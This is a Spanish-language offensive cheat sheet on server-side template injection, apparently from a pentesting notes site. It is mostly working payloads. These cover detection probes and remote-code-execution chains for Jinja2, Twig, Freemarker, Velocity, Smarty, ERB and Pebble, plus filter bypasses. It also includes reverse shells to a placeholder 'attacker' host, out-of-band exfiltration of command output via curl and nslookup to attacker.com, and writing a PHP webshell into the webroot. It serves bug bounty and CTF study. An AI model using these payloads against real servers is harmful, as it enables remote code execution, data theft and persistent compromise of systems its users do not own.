---
icon: database
---

# SSTI - Server-Side Template Inyection

SSTI ocurre cuando input del usuario se incrusta directamente en una plantilla que luego el motor de plantillas evalúa. Si el motor ejecuta la expresión en lugar de tratarla como texto, el atacante puede ejecutar código arbitrario en el servidor.

```python
# Código vulnerable (Flask/Jinja2)
@app.route("/greet")
def greet():
    name = request.args.get("name")
    template = f"Hello, {name}!"          # ← concatenación directa
    return render_template_string(template)

# Input normal:    name=Juan    → "Hello, Juan!"
# Input malicioso: name={{7*7}} → "Hello, 49!"  (la expresión se evaluó)
# RCE:             name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Detección - payload universal

El primer paso es confirmar que las expresiones se evalúan:

```
{{7*7}}       → 49  (Jinja2, Twig)
${7*7}        → 49  (Freemarker, Smarty, Mako)
#{7*7}        → 49  (Ruby ERB, Thymeleaf)
*{7*7}        → 49  (Thymeleaf)
<%= 7*7 %>    → 49  (ERB, EJS)
${7*7}        → 49  (Velocity, Freemarker)
{{= 7*7}}     → 49  (Pebble)
@(7*7)        → 49  (Razor .NET)
```

Si la respuesta muestra `49` donde pusimos la expresión - SSTI confirmado.

### Árbol de identificación del motor

```
Probar en orden:

{{7*7}}
├── Devuelve 49       → Jinja2 o Twig
│   └── {{7*'7'}}
│       ├── 7777777   → Jinja2 (Python)
│       └── 49        → Twig (PHP)
│
${7*7}
├── Devuelve 49       → Freemarker, Smarty, Mako, Velocity
│   └── ${7*7} con error de Java → Freemarker
│   └── ${7*7} con error PHP     → Smarty
│
#{7*7}
├── Devuelve 49       → Ruby ERB o Thymeleaf
│
<%= 7*7 %>
├── Devuelve 49       → Ruby ERB, EJS
│
Error con {{          → Motor con delimitadores distintos
Sin respuesta         → Posible blind SSTI (probar time-based)
```

***

### Jinja2 (Python — Flask, Django)

#### Confirmación

```python
{{7*7}}           → 49
{{7*'7'}}         → 7777777   ← confirma Jinja2 (no Twig)
{{config}}        → muestra configuración de Flask
{{self.__dict__}} → muestra variables internas
```

#### Escalada a RCE

```python
# Via config (Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Via class hierarchy (más universal)
# Recorrer la jerarquía de clases Python para llegar a subprocess
{{''.__class__.__mro__[1].__subclasses__()}}
# Buscar la clase subprocess.Popen o warnings.catch_warnings

# Método clásico — acceder a __builtins__ y luego a __import__
{{''.__class__.__mro__[1].__subclasses__()[INDICE].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# Buscar el índice de la clase correcta:
{% for i in range(500) %}
  {% if ''.__class__.__mro__[1].__subclasses__()[i].__name__ == 'catch_warnings' %}
    {{i}}
  {% endif %}
{% endfor %}

# Payload compacto (Jinja2 — busca __import__ en globals de cualquier subclase)
{{''.__class__.__mro__[1].__subclasses__()[INDICE_warnings].__init__.__globals__['__builtins__']['__import__']('os').system('id')}}

# Via request.application (Flask específico)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Via cycler, joiner, namespace (Jinja2 globals disponibles)
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}

# Reverse shell
{{cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/attacker/9001 0>&1"').read()}}
```

#### Bypass de filtros en Jinja2

```python
# Si los puntos están filtrados
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# Si las llaves están filtradas (usar tags de bloque)
{% if 7*7 == 49 %}SSTI{% endif %}

# Si '_' está filtrado
{{request|attr(request.args.x)}}&x=__class__

# Usando |attr() para acceder a atributos sin punto
{{''|attr('__class__')|attr('__mro__')}}
```

***

### Twig (PHP — Symfony, Laravel parcial)

#### Confirmación

```
{{7*7}}    → 49
{{7*'7'}}  → 49  ← confirma Twig (no Jinja2)
{{_self}}  → objeto del template actual
```

#### Escalada a RCE

```php
# Acceder a _self para llegar a funciones PHP
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# Via getFilter con system
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("id")}}

# Reverse shell
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/attacker/9001 0>&1'")}}

# Via setRawFilter
{{"/etc/passwd"|file_excerpt(1,30)}}  ← si el filtro file_excerpt existe

# Clase de Twig para exec
{{['id']|filter('system')}}
{{['id', 0]|sort('passthru')}}
{{['id']|map('passthru')}}

# Si se puede acceder a __ENV__ global
{{dump(_context)}}   ← expone variables del contexto
```

***

### Freemarker (Java — Spring MVC, Apache)

#### Confirmación

```
${7*7}       → 49
${7*"7"}     → error (Freemarker no multiplica strings así)
#{7*7}       → 49  (número formateado)
```

#### Escalada a RCE

```java
// Via freemarker.template.utility.Execute
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

// Via freemarker.template.utility.ObjectConstructor
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.lang.ProcessBuilder",["id"]).start().getInputStream()))>
<#list 0..10000 as _>
  <#assign line=br.readLine()!>
  <#if line?has_content>${line}<br></#if>
</#list>

// Via ClassLoader
${product.getClass().getProtectionDomain().getCodeSource().getLocation()}
<#assign cl=product.getClass().getClassLoader()>
${cl.loadClass("java.lang.Runtime").getMethod("exec","".getClass()).invoke(cl.loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

***

### Velocity (Java — Apache)

#### Confirmación

```
${7*7}     → 49
$class.inspect("java.lang.Runtime", this)
```

#### Escalada a RCE

```java
#set($str=$class.inspect("java.lang.String",this))
#set($chr=$class.inspect("java.lang.Character",this))
#set($ex=$class.inspect("java.lang.Runtime",this).exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
...

// Método directo
#set($rt = $class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))
#set($exec = $rt.exec("id"))
#set($in = $exec.getInputStream())
...
```

***

### Smarty (PHP)

#### Confirmación

```
{$smarty.version}    → versión de Smarty
{7*7}                → 49
```

#### Escalada a RCE

```php
// Smarty permite llamar a funciones PHP directamente
{php}system('id');{/php}    ← versiones antiguas (antes de Smarty 3.1)

// Smarty 3.1+
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

// Via {if} que evalúa PHP
{if system('id')}{/if}

// getStreamVariable
{self::getStreamVariable("file:///etc/passwd")}
```

***

### ERB (Ruby — Rails)

#### Confirmación

```
<%= 7*7 %>   → 49
<%= system("id") %>
```

#### Escalada a RCE

```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= require 'open3'; Open3.capture2("id")[0] %>

# Reverse shell
<%= system("bash -c 'bash -i >& /dev/tcp/attacker/9001 0>&1'") %>
```

***

### Pebble (Java)

```java
// Confirmación
{{7*7}}   → 49

// RCE
{%for i in 1..1%}
  {%set cmd="id"%}
  {%set rt = "".class.forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null)%}
  {%set exec = rt.exec(cmd)%}
  {%set inputStream = exec.getInputStream()%}
  {%set reader = "".class.forName("java.io.InputStreamReader").getDeclaredConstructors()[0].newInstance([inputStream])%}
  {%set buffer = "".class.forName("java.io.BufferedReader").getDeclaredConstructors()[0].newInstance([reader])%}
  {{buffer.readLine()}}
{%endfor%}
```

***

### SSTI Blind

Cuando no hay output visible en la respuesta:

```python
# Time-based (Jinja2)
{{''.__class__.__mro__[1].__subclasses__()[INDICE].popen('sleep 5')}}
{{cycler.__init__.__globals__.os.popen('sleep 5').read()}}

# OOB — DNS/HTTP
{{cycler.__init__.__globals__.os.popen('curl http://attacker.com/$(id|base64)').read()}}
{{cycler.__init__.__globals__.os.popen('nslookup $(whoami).attacker.com').read()}}

# Escribir webshell al disco (si hay webroot conocido)
{{cycler.__init__.__globals__.os.popen('echo "<?php system($_GET[cmd]); ?>" > /var/www/html/shell.php').read()}}
# Acceder a: https://target.com/shell.php?cmd=id
```

***

### Tabla resumen de RCE por motor

| Motor      | Lenguaje | Payload de RCE más simple                                                                                   |
| ---------- | -------- | ----------------------------------------------------------------------------------------------------------- |
| Jinja2     | Python   | `{{cycler.__init__.__globals__.os.popen('id').read()}}`                                                     |
| Twig       | PHP      | `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`                      |
| Freemarker | Java     | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`                                       |
| Smarty     | PHP      | `{if system('id')}{/if}`                                                                                    |
| ERB        | Ruby     | `<%= system("id") %>`                                                                                       |
| Velocity   | Java     | `#set($rt=$class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null))#set($e=$rt.exec("id"))` |

***

> 💡 El payload `{{7*7}}` es inofensivo y universal — siempre empezar con él para confirmar SSTI antes de intentar RCE. En bug bounty es suficiente para demostrar la vulnerabilidad.

> 🔍 **SSTImap** y **tplmap** automatizan la detección del motor y la explotación con un solo comando, similar a sqlmap para SQLi.

> ⚠️ Jinja2 es el motor más común en CTFs y bug bounty (Flask es muy popular). Memorizar el payload `{{cycler.__init__.__globals__.os.popen('id').read()}}` es suficiente para el 80% de los casos.
